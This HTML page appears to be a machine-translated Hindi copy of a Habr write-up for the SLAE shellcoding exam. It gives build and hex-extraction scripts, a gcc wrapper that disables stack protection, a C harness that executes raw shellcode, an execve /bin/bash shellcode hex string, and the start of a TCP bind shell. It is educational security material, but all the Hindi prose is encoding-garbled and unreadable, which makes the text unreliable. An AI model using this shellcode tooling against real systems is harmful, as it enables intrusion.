<!doctype html>
<html class="no-js" lang="hi">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ЁЯзСЁЯП╝тАНЁЯдЭтАНЁЯзСЁЯП╝ тЧ╝я╕П ЁЯЪ┤ЁЯП╗ SLAE - рд╕реБрд░рдХреНрд╖рд╛ рд▓рд┐рдирдХреНрд╕ рд╡рд┐рдзрд╛рдирд╕рднрд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рдкрд░реАрдХреНрд╖рд╛ ЁЯжЕ ЁЯСиЁЯП╛тАНЁЯТ╝ ЁЯд╜ЁЯП╗</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="рд╕реБрд░рдХреНрд╖рд╛ рд▓рд┐рдирдХреНрд╕ рдЕрд╕реЗрдВрдмрд▓реА рдПрдХреНрд╕рдкрд░реНрдЯ - рд╕реВрдЪрдирд╛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд▓рд┐рдирдХреНрд╕-рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЗрдВрдЯреЗрд▓ рдкреНрд░реЛрд╕реЗрд╕рд░ рдкрд░рд┐рд╡рд╛рд░ рдХреА 32-рдмрд┐рдЯ рдЕрд╕реЗрдВрдмрд▓реА рднрд╛рд╖рд╛ рдХреА рдореВрд▓ рдмрд╛рддреЗрдВ рдкрд░ рдПрдХ рдСрдирд▓рд╛рдЗрди...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>SLAE - рд╕реБрд░рдХреНрд╖рд╛ рд▓рд┐рдирдХреНрд╕ рд╡рд┐рдзрд╛рдирд╕рднрд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рдкрд░реАрдХреНрд╖рд╛</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/488416/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/nj/sc/fb/njscfbnkoirqggp_ns8h9upvies.png" alt="рдЫрд╡рд┐"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╕реБрд░рдХреНрд╖рд╛ рд▓рд┐рдирдХреНрд╕ рдЕрд╕реЗрдВрдмрд▓реА рдПрдХреНрд╕рдкрд░реНрдЯ - рд╕реВрдЪрдирд╛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд▓рд┐рдирдХреНрд╕-рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЗрдВрдЯреЗрд▓ рдкреНрд░реЛрд╕реЗрд╕рд░ рдкрд░рд┐рд╡рд╛рд░ рдХреА 32-рдмрд┐рдЯ рдЕрд╕реЗрдВрдмрд▓реА рднрд╛рд╖рд╛ рдХреА рдореВрд▓ рдмрд╛рддреЗрдВ рдкрд░ рдПрдХ рдСрдирд▓рд╛рдЗрди рдкрд╛рдареНрдпрдХреНрд░рдо рдФрд░ рдкрд░реАрдХреНрд╖рд╛ред </font><font style="vertical-align: inherit;">рдпрд╣ рдкрд╛рдареНрдпрдХреНрд░рдо рдкрдВрдЪрдХрд░реНрдорд┐рдпреЛрдВ, рд╕реВрдЪрдирд╛ рд╕реБрд░рдХреНрд╖рд╛ рдЗрдВрдЬреАрдирд┐рдпрд░реЛрдВ рдФрд░ рдЬреЛ рдХреЛрдИ рднреА рдЕрд╕реЗрдВрдмрд▓рд░ рдХреА рдореВрд▓ рдмрд╛рддреЗрдВ рд╕рдордЭрдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ рдФрд░ рд╕рд░рд▓ рд╢реЗрд▓рдХреЛрдб рд▓рд┐рдЦрдирд╛ рд╕реАрдЦрддрд╛ рд╣реИ, рдЙрд╕рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ред </font><font style="vertical-align: inherit;">рдкрд╛рдареНрдпрдХреНрд░рдо рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк рд╕реАрдЦреЗрдВрдЧреЗ рдХрд┐ рдмреБрдирд┐рдпрд╛рджреА рд▓рд┐рдирдХреНрд╕ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ, рд╕рд░рд▓ рд╢реЗрд▓рдХреЛрдб рд▓рд┐рдЦреЗрдВ, рдФрд░ рдХрд░реНрдиреЗрд▓ рд╕реНрддрд░ рдкрд░ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдмреБрдирд┐рдпрд╛рджреА рд╕рд┐рджреНрдзрд╛рдВрддреЛрдВ рдХреЛ рд╕рдордЭрдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВред </font><font style="vertical-align: inherit;">рдпрд╣ рд▓реЗрдЦ рдЗрд╕ </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдкрд╛рдареНрдпрдХреНрд░рдо рдХреЗ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> рд▓рд┐рдП рдкрд░реАрдХреНрд╖рд╛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд╡рд░ рдХрд░реЗрдЧрд╛ </font><font style="vertical-align: inherit;">ред </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкрд░реАрдХреНрд╖рд╛ рдХреА рд╢рд░реНрддреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЖрдкрдХреЛ 7 рдХрд╛рд░реНрдп рдкреВрд░реЗ рдХрд░рдиреЗ рд╣реЛрдВрдЧреЗ:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдЯреАрд╕реАрдкреА рдмрд┐рдВрдж рд╢реИрд▓ рд▓рд┐рдЦреЗрдВ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рд░рд┐рд╡рд░реНрд╕ рдЯреАрд╕реАрдкреА рд╢реЗрд▓ рд▓рд┐рдЦреЗрдВ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Egghunter рддрдХрдиреАрдХ рд╕реЗ рдирд┐рдкрдЯреЗрдВ рдФрд░ рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рджреЗрдВ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдПрдХ рдХреЛрдб рдПрдирдХреЛрдбрд░ рд▓рд┐рдЦреЗрдВ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GDB / ndisasm / libemu рдХреЗ рд╕рд╛рде msfvenom рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди 3 рд╢реЗрд▓рдХреЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 рдХрд┐рд╕реА рднреА рд╢реЗрд▓рдХреЛрдб рдФрд░ рд╢реЗрд▓рд╕реНрдЯреЙрд░реНрдо рдХреЗ рдмрд╣реБрд░реВрдкреА рд░реВрдкрд╛рдВрддрд░рдг рдХрд░реЗрдВред</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдПрдХ рдХреЛрдб рдПрдирдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ</font></font></li>
</ol><a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкреНрд░рддреНрдпреЗрдХ рдХрд╛рд░реНрдп рдкрд░ рдЯрд┐рдкреНрдкрдгреА рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдпрд╣ рдЙрди рдкрд░ рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рд╡рд╛рдВрдЫрдиреАрдп рд╣реИред </font><font style="vertical-align: inherit;">рдЪрд▓реЛ рддреИрдпрд╛рд░реА рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВред</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдкреНрд░рд╢рд┐рдХреНрд╖рдг</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╕реНрд╡рдЪрд╛рд▓рди рд╣рдорд╛рд░реА рд╕рдм рдХреБрдЫ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЖрдЧреЗ рдмрдврд╝рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рдкрд╛рдареНрдпрдХреНрд░рдо рдореЗрдВ рдорд╣рд╛рд░рдд рд╣рд╛рд╕рд┐рд▓ рдХрд░рдиреЗ рдФрд░ рдкрд░реАрдХреНрд╖рд╛ рдкрд╛рд╕ рдХрд░рдиреЗ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд▓рд┐рдкрд┐рдпреЛрдВ рдХрд╛ рд╡рд░реНрдгрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рд╡реЗ рд╕рдордп рдФрд░ рдкреНрд░рдпрд╛рд╕ рдХреЛ рдмрдЪрд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдВрдЧреЗред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nasm32.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
<span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage ./nasm32 &lt;nasmMainFile&gt; (no extension)"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
<span class="hljs-keyword">if</span> [ ! -e <span class="hljs-string">"<span class="hljs-variable">$1</span>.asm"</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error, <span class="hljs-variable">$1</span>.asm not found."</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note, do not enter file extensions"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
nasm -f elf <span class="hljs-variable">$1</span>.asm -o <span class="hljs-variable">$1</span>.o<font></font>
ld -m elf_i386 -o <span class="hljs-variable">$1</span> <span class="hljs-variable">$1</span>.o</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рддреЗрдЬреА рд╕реЗ рд╕рдВрдХрд▓рди рдФрд░ рд▓рд┐рдВрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">popcode.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
target=<span class="hljs-variable">$1</span><font></font>
<font></font>
objdump -D -M intel <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> | grep <span class="hljs-string">'[0-9a-f]:'</span> | grep -v <span class="hljs-string">'file'</span> | cut -f2 -d: | cut -f1-7 -d<span class="hljs-string">' '</span> | tr -s <span class="hljs-string">' '</span> | tr <span class="hljs-string">'\t'</span> <span class="hljs-string">' '</span> | sed <span class="hljs-string">'s/ $//g'</span> | sed <span class="hljs-string">'s/ /\\x/g'</span> | paste -d <span class="hljs-string">''</span> -s</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдо рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЛрдб рдХреЛ рд╣реЗрдХреНрд╕-рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВрдЧреЗ, рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рд╡рд░реНрдг рд╕реЗ рдкрд╣рд▓реЗ "\ x" рдкреНрд░рд┐рдВрдЯ рд╣реЛрдЧрд╛ред </font><font style="vertical-align: inherit;">рдпрд╣ рд╣рдорд╛рд░реЗ рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕реА-рдлрд╛рдЗрд▓ рдореЗрдВ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hexopcode.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
target=<span class="hljs-variable">$1</span><font></font>
<font></font>
objdump -D -M intel <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> | grep <span class="hljs-string">'[0-9a-f]:'</span> | grep -v <span class="hljs-string">'file'</span> | cut -f2 -d: | cut -f1-7 -d<span class="hljs-string">' '</span> | tr -s <span class="hljs-string">' '</span> | tr <span class="hljs-string">'\t'</span> <span class="hljs-string">' '</span> | sed <span class="hljs-string">'s/ $//g'</span> | sed <span class="hljs-string">'s/ /\\x/g'</span> | paste -d <span class="hljs-string">''</span> -s | sed -e <span class="hljs-string">'s!\\x!!g'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдпрд╣рд╛рдВ рд╕рдм рдХреБрдЫ рд╕рдорд╛рди рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ рдКрдкрд░ рдХреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рд╣реИ, рдХреЗрд╡рд▓ рдХреЛрдб "\ x" рдХреЗ рдмрд┐рдирд╛ рдореБрджреНрд░рд┐рдд рд╣реЛрддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдирд┐рдореНрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд▓рд┐рдП рд╣реЗрдХреНрд╕ рдХреЛрдб рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hex2stack.py</font></font></b><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys<font></font>
<font></font>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
	<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
		print(<span class="hljs-string">"Enter opcode in hex"</span>)<font></font>
		sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
	string = sys.argv[<span class="hljs-number">1</span>]<font></font>
<font></font>
	reversed = [string[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(string),<span class="hljs-number">2</span>)][::<span class="hljs-number">-1</span>]<font></font>
<font></font>
	l = len(reversed) % <span class="hljs-number">4</span>
	<span class="hljs-keyword">if</span> l:<font></font>
		print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">"90"</span>*(<span class="hljs-number">4</span>-l) + <span class="hljs-string">""</span>.join(reversed[<span class="hljs-number">0</span>:l]))<font></font>
<font></font>
	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> range(l, len(reversed[l:]), <span class="hljs-number">4</span>):<font></font>
		print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">""</span>.join(reversed[p:p+<span class="hljs-number">4</span>]))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдХреЛрдб рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдирд╛ рдЖрд╕рд╛рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕реЗ рд╕реНрдЯреИрдХ рдкрд░ рдзрдХреЗрд▓ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рдЙрд▓рдЯреЗ рдХреНрд░рдо рдореЗрдВ рдвреЗрд░ рдкрд░ рдзрдХреЗрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдзрдХреНрдХрд╛</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> рдЖрджреЗрд╢ </font><font style="vertical-align: inherit;">ред </font><font style="vertical-align: inherit;">рдКрдкрд░ рдХреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реЗрдХреНрд╕ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдирд╡рд░реНрдЯ рдХрд░рддреА рд╣реИред </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдЙрджрд╛рд╣рд░рдг:</font></font></i><br>
<br>
<pre><code class="plaintext hljs">$./stack_shell.py 31c0506a68682f626173682f62696e89e35089c25389e1b00bcd80<font></font>
	push 0x9080cd0b<font></font>
	push 0xb0e18953<font></font>
	push 0xc28950e3<font></font>
	push 0x896e6962<font></font>
	push 0x2f687361<font></font>
	push 0x622f6868<font></font>
	push 0x6a50c031</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uscompile.sh</font></font></b><br>
<br>
<pre><code class="bash hljs"><span class="hljs-meta">#!/bin/bash
</span>
<span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage ./compile &lt;cFile&gt; (no extension)"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
<span class="hljs-keyword">if</span> [ ! -e <span class="hljs-string">"<span class="hljs-variable">$1</span>.c"</span> ]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error, <span class="hljs-variable">$1</span>.c not found."</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note, do not enter file extensions"</span>
  <span class="hljs-built_in">exit</span>
<span class="hljs-keyword">fi</span><font></font>
<font></font>
gcc -masm=intel -m32 -ggdb -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o <span class="hljs-variable">$1</span> <span class="hljs-variable">$1</span>.c</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдХреНрд╖рдо рд╕реНрдЯреИрдХ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд╕рд╛рде рдПрдХ рд╕реА-рдлрд╛рдЗрд▓ рд╕рдВрдХрд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рд╢реИрдХреНрд╖рд┐рдХ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд╛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode.c</font></font></b><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> code[] =
<span class="hljs-string">""</span>;<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Shellcode Length:  %d\n"</span>, <span class="hljs-built_in">strlen</span>(code));
        <span class="hljs-keyword">int</span> (*ret)() = (<span class="hljs-keyword">int</span>(*)())code;<font></font>
        ret();<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╕реНрд╡рдпрдВ рд╕реА-рдлрд╛рдЗрд▓, рдЬрд┐рд╕рдореЗрдВ рд╣рдо рдЕрдкрдирд╛ рд╢реЗрд▓рдХреЛрдб рдбрд╛рд▓рддреЗ рд╣реИрдВред</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдХрд╛рд░реНрдп</font></font></h3><br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. рдЯреАрд╕реАрдкреА рдмрд╛рдЗрдВрдб рд╢реЗрд▓ рд▓рд┐рдЦреЗрдВ</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдо рд╕рд░рд▓рддрдо рдЯреАрд╕реАрдкреА-рдмрд╛рдЗрдВрдб рд╢реЗрд▓ рд▓рд┐рдЦреЗрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрджреЗрд╢ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ рд╣реИ:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рд╣рдо рд╕реЙрдХреЗрдЯ () рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реЙрдХреЗрдЯ рдмрдирд╛рддреЗ рд╣реИрдВ; рдирд┐рд░реНрдорд╛рдг рдкрд░, рд╣рдореЗрдВ рдПрдХ рд╕реЙрдХреЗрдЯ рд╡рд┐рд╡рд░рдгрдХ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реИ;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдирд┐рд░реНрдорд┐рдд рд╕реЙрдХреЗрдЯ рдХреЗ рд▓рд┐рдП, рдорд╛рдкрджрдВрдбреЛрдВ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ - рдкреНрд░реЛрдЯреЛрдХреЙрд▓, рд╡рд╣ рдкрддрд╛ рдЬрд╣рд╛рдВ рдпрд╣ "рд╕реБрдиреЛ", рдкреЛрд░реНрдЯ - рдФрд░ рдПрдХ рдмрд╛рдЗрдВрдб () рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд░реЗрдЧрд╛, рдЬреЛ рд╣рдорд╛рд░реЗ рд╕реЙрдХреЗрдЯ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдорд╛рдкрджрдВрдбреЛрдВ рдХреЛ рдареАрдХ рдХрд░реЗрдЧрд╛;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдлрд┐рд░ рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХреЙрд▓ рдХрд░реЗрдВ () - рдЖрд╡рдХ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд╕реЙрдХреЗрдЯ "рд╕реБрдирддрд╛ рд╣реИ";</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдХреЗрд╡рд▓ рдХрдиреЗрдХреНрд╢рди рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИ, рдЙрдиреНрд╣реЗрдВ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рд▓рд┐рдП - рд╕реНрд╡реАрдХрд╛рд░ ();</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╣рдорд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдЗрдирдкреБрдЯ, рдЖрдЙрдЯрдкреБрдЯ рдФрд░ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреЗ рдорд╛рдирдХ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ: рдбреБрдк 2 () рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░реЗрдВ;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдФрд░ рдЖрдЦрд┐рд░реА: рд╣рдо рдПрдХ рдХрдорд╛рдВрдб рд╢реЗрд▓ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЕрд╕реЗрдВрдмрд▓реА рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рд╕реА рдореЗрдВ рдЙрдкрд░реЛрдХреНрдд рдЙрджрд╛рд╣рд░рдг рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ред</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
